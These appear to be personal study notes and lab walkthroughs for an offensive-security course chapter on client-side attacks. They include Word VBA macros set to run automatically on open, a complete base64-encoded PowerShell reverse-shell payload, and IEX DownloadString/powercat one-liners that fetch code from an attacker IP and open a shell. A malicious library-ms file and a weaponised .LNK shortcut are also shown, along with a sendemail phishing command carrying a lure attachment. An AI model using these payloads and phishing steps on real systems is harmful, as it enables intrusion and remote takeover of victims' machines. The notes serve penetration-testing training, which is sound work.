# Client Side Attacks

## 12.1.1 Information Gathering
Analyze metadate on CORP docs to find info on targets.
Google dork to find the docs: site:megacorpone.com  filetype:pdf

Can use theHarvester, for more intensive OSINT search : https://github.com/laramies/theHarvester

exiftool -a -u brochure.pdf

gobuster dir -u 192.168.205.197 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x .pdf -t 20 

## 12.1.2
https://canarytokens.com/nest/ : website to generate tokens we can embed in email, wherever, to send to our targets.
I used this during TCM PEH course as well.
Use the token to Client/Device Fingerprint our target.

Create token, choose Web bug / URL token.  Enter https://example.com as webhook URL, then FINGERPRINTING as comment.

## 12.12 Exploiting Microsoft Office - Word Macros

Macros in [_Visual Basic for Applications_](https://docs.microsoft.com/en-us/office/vba/api/overview/) (VBA) provide full access to [_ActiveX objects_](https://en.wikipedia.org/wiki/ActiveX) and the Windows Script Host, similar to JavaScript in HTML applications.
To use Macros, we need to use .doc not .docx, as .docx requires a containing template.

MS Word -> View -> Macros ->  Name, Mymacro -> Create.
To get the MACRO to auto execute, when the doc open , we add AutoOpen() and Document_Open()
Note: there is a 255-character limit for literal strings, so we need to split up base64-encoded PS commands into multiple strings, and then concatenate.

```
# Powershell RevShell that is getting encoded : 
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.158/powercat.ps1');powercat -c 192.168.45.158 -p 4444 -e powershell
```

python script to split our base64 encoded powershell into multiple strings easily..

```python
str = "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwA..."

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```

macro shell

```

Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    CreateObject("Wscript.Shell").Run Str
End Sub
```

## 12.3.1 Obtaining Code Execution via Windows Library Files
### Prep WebDAV Share

```bash
sudo apt install python3-wsgidav   # install WebDAV share

mkdir /home/kali/hacking/tools/webdav
touch /home/kali/hacking/tools/webdav/test.txt

/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/hacking/tools/webdav/
test at 127.0.0.1 in browser
```
### Create Library-ms file
- Open VSC/notepad
- save empty file named config.Library-ms on the users desktop
- Library files have 3 major parts
- written in XML to specify parameters for accessing remote locations
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.158</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>


<!--
<name>@windows.storage.dll,-34582</name>
This specifies the name of the library, not arbitrary

<version>6</version>
this can be whatever we want

<isLibraryPinned>true</isLibraryPinned>
Pin to navigation in explorer, makes it feel authentic

<iconReference>imageres.dll,-1003</iconReference>
What ICON is displayed to user, use imagesres.dll to choose between windows icons
-1002 = Documents folder icon,  -1003 = Pictures folder icon

<templateInfo> <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType> </templateInfo>
GUID is valid Documents guid.. 

<url>http:/192.168.45.158</url>  - KALI IP
-->
```
- Now when we launch that, we should see our test.txt file, being served by our WebDAV share on KALI
- After connecting, you'll notice Windows modified some parts of the file, which may/will break it if you try to move it to an other machine

### Create Shortcut .LNK
- Right-click, new Shortcut
- Enter powershell command
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.158:8000/powercat.ps1');powercat -c 192.168.45.158 -p 4444 -e powershell"
```
- Name shortcut  **automatic_configuration**
- Copy the file to the VM#2 `smbclient //192.168.205.195/share -c 'put config.Library-ms'`


```


# Labs
12.1.1 Q1 
gobuster dir -u 192.168.205.197 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x .pdf -t 20 
exiftool -a -u info.pdf

12.1.2 Q1  : Canary token created : http://canarytokens.com/feedback/51yhmhq24v0uumkrl9v7cmaw2/contact.php


12.2.3 Q1 /Q2 : 
192.168.205.196 client-side-Attacks - Microsoft Word Macro - VM #1 OS Credentials:
192.168.205.198 client-side-Attacks - Microsoft Word Macro - VM #2 OS Credentials:
1. Perform the steps from this section to create a malicious Word document containing a macro with the name **MyMacro** on the _OFFICE_ (VM #1) machine. For this, you have to install Microsoft Office on VM #1 again as outlined in the section "Installing Microsoft Office". Confirm that the macro works as expected by obtaining a reverse shell from the _OFFICE_ machine. We can log in with offsec:lab. What keyword is used to declare a variable in VBA?
2. 
3. Once you have confirmed that the macro from the previous exercise works, upload the document containing the macro _MyMacro_ in the file upload form (port 8000) of the _TICKETS_ (VM #2) machine with the name **ticket.doc**. A script on the machine, simulating a user, checks for this file and executes it. After receiving a reverse shell, enter the flag from the **flag.txt** file on the desktop for the _Administrator_ user. For the file upload functionality, add **tickets.com** with the corresponding IP address in **/etc/hosts**. Please note that it can take up to three minutes after uploading the document for the macro to get executed.
```
$Text = 'IEX(New-Object System.Net.WebClient).DownloadString("http://192.168.45.158/powercat.ps1");powercat -c 192.168.45.158 -p 4444 -e powershell'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText

```


```powershell
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
Str = Str + "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBj"
Str = Str + "AGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA4ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdAB"
Str = Str + "TAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJA"
Str = Str + "BiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAe"
Str = Str + "QBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgA"
Str = Str + "IAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4"
Str = Str + "AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAG"
Str = Str + "MAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7A"
Str = Str + "CQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
    CreateObject("Wscript.Shell").Run Str
End Sub
```

12.3.1 Q1 
192.168.205.194   VM1
192.168.205.195   VM2

```
offsec / lab
config.library-ms
smbclient //192.168.50.195/share -c 'put config.Library-ms'

# in two commands, 
smbclient //192.168.205.195/share 
put config.Library-ms
```

12.3.1 Q3 
192.168.205.194   VM3
192.168.205.199  VM4

PORT    STATE SERVICE REASON          VERSION
587/tcp open  smtp    syn-ack ttl 125 hMailServer smtpd
|_banner: 220 ADMIN ESMTP
| smtp-commands: ADMIN, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE
Service Info: Host: ADMIN; OS: Windows; CPE: cpe:/o:microsoft:windows

feroxbuster -u http://192.168.205.199/ -t 100 -x "txt,pdf" -k -q  -d 2 
http://192.168.205.199/info.pdf


Found info.pdf at : feroxbuster -u http://192.168.205.199/ -t 100 -x "txt,pdf" -k -q  -d 2 

PDF reads:
Admin server host an e-mail server
![](/91-Courses/00-Offsec-PWK/assets/12-3-1-Q3.png)

using Exif tool on the image reveals the creator.. Dave Wizard.
So if Dave Wizard is the creator, we should be able to use our email and send him a webdav file or LNK file to execute.

```bash
 exiftool -u -a info.pdf

Author                          : Dave Wizard
Producer                        : Microsoft® PowerPoint® for Microsoft 365
Creator                         : Dave Wizard
```
Dave.Wizard@supermagicorg.com

our username is : test@supermagicorg.com   password test


```bash

sendemail -f test@supermagicorg.com -t Dave.Wizard@supermagicorg.com -s 192.168.205.199:587 -xu test@supermagicorg.com -xp test -u "Urgent: please open my attachment" -m "Urgent: please open my attachment." -a ./config.Library-ms  -o tls=yes
Oct 23 00:23:10 kali sendemail[1090229]: Email was sent successfully!
```

OK, so after a couple of minutes, the user opened my EMAIL, and then my WebDAV library, and then the .lnk present connected back to me and we got shell!
